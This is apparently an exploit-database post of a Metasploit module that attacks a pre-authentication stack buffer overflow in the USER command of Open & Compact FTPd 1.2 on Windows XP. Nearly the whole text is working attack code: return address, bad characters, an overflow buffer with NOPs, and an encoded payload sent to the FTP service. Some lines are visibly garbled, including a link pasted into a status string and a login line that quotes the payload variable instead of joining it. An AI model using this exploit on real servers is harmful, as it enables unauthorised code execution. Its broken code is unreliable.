# Exploit Title: Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow MSF
# Date: March 14, 2010
# Author: Blake
# Version: 1.2
# Tested on: XP SP3

Exploit causes the ftp server to crash so adduser, etc. payloads are most effective.



require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking

    include Msf::Exploit::Remote::Ftp

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow',
            'Description'    => %q{
                This module exploits a stack overflow in the USER verb in Open & Compact FTPd version 1.2. The program will crash once the payload is sent, so bind shell payloads are not effective.

            },
            'Author'         => 'Blake',
            'License'        => MSF_LICENSE,
            'Version'        => 'Version 1',
            'References'     =>
                [
                    [ 'EDB-ID', '11420'],
                    [ 'URL', 'http://www.exploit-db.com/exploits/11420' ],
                ],
            'Privileged'     => true,
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'    => 400,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x00202c42 } ],

                ],
            'DisclosureDate' => 'Feb 12, 2010',
            'DefaultTarget'  => 0))
    end


    def exploit
        connect

        sploit =  "\x42\x2c\x20" * 199
        sploit << make_nops(10)
        sploit << payload.encoded

        print_status("Trying target {target.name<http://target.name>}...")

        login = "USER + sploit + \r\n"
        login << "PASS " + rand_text_alphanumeric(12)

        sock.put(login + "\r\n")

        handler
        disconnect
    end

end

